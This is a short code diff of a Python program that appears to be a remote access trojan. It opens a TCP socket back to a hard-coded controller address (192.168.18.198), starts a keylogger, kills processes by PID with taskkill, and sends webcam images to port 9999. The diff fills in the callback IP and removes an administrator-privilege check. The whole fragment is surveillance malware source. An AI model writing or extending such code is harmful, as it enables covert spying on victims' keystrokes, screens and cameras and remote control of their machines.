@@ -19,11 +19,10 @@ import pyaudio
 from pynput.keyboard import Key, Controller
 from mss import mss
 import numpy as np
-import ctypes
 from filetarget import download_file, upload_file
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ip = ''
+ip = '192.168.18.198'
 main_log1 = threading.Event()
 
 def start_log():
@@ -74,12 +73,6 @@ def pidkill(cmd):
         os.system(f"taskkill /PID {cmd} /F")
     except:
         return
-
-def check_priv():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
 
 def send_camera_image(ip, port=9999):
     cap = cv2.VideoCapture(0)
